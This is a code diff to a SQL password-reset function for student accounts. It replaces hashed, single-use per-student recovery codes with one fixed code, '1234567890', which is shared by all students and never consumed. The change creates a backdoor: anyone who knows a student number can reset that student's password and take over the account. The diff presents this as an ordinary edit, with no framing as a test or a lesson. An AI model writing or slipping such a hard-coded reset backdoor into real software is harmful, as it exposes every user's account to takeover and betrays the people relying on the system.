@@ -105,7 +105,7 @@ exception when unique_violation then
 end;
 $$;
 
--- A recovery code is checked and consumed atomically; it can only be used once.
+-- Fixed recovery code for all students: 1234567890 (reusable, not consumed).
 create or replace function public.reset_student_password(
   p_student_number text,
   p_recovery_code text,
@@ -128,8 +128,7 @@ begin
   select id into v_student_id
   from public.oop_students
   where student_number = trim(p_student_number)
-    and recovery_code_hash is not null
-    and extensions.crypt(trim(p_recovery_code), recovery_code_hash) = recovery_code_hash
+    and trim(p_recovery_code) = '1234567890'
   for update;
 
   if not found then
@@ -138,8 +137,7 @@ begin
 
   update public.oop_students
   set password_hash = extensions.crypt(p_new_password, extensions.gen_salt('bf', 12)),
-      password = encode(extensions.gen_random_bytes(32), 'hex'),
-      recovery_code_hash = null
+      password = encode(extensions.gen_random_bytes(32), 'hex')
   where id = v_student_id;
 
   return true;
